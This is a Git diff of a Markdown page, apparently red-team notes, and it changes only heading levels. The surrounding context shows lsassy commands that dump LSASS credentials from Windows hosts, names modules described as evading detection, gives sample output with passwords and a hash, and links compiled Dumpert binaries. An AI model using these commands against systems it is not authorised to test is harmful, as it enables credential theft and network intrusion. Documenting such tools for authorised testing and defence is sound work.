@@ -85,7 +85,7 @@ example:
 
 ## Examples
 
-#### Dump lsass from single target
+### Dump lsass from single target
 
 ```plain
 $ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' <target>
@@ -93,7 +93,7 @@ $ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' <target>
 [+] [10.10.10.10] offsec.nl\john.do   Welkom1234
 ```
 
-#### Dump lsass from range of IP's
+### Dump lsass from range of IP's
 
 ```plain
 $ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' 10.10.10.10-12
@@ -103,7 +103,7 @@ $ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' 10.10.10
 [+] [10.10.10.12] offsec.nl\el.prof   NietWelkom
 ```
 
-#### Dump lsass with module
+### Dump lsass with module
 
 Modules that can be used without prerequisites and from experience are not generally detected:
 
@@ -111,7 +111,7 @@ Modules that can be used without prerequisites and from experience are not gener
 * procdump_embedded
 * mirrordump_embedded
 
-##### comsvcs_stealth
+#### comsvcs_stealth
 
 ```plain
 $ lsassy -d offsec.nl -u john.do -p 'Welkom1234' 10.10.10.10 -m comsvcs_stealth
@@ -126,7 +126,7 @@ $ lsassy -d offsec.nl -u john.do -p 'Welkom1234' 10.10.10.10 -m comsvcs_stealth
 [+] 10.10.10.10 offsec.nl\PDC01$  [PWD] c1e3cebd8f9628c752b34ca1290d8771cb159fedb2298219f7[...]28bc2fe4ddc56b0e98a019bb072
 ```
 
-##### Dumpert
+#### Dumpert
 
 {{%attachments title="Compiled binaries" fa_icon_class="far fa-file" pattern=".*(exe|dll)"/%}}
 
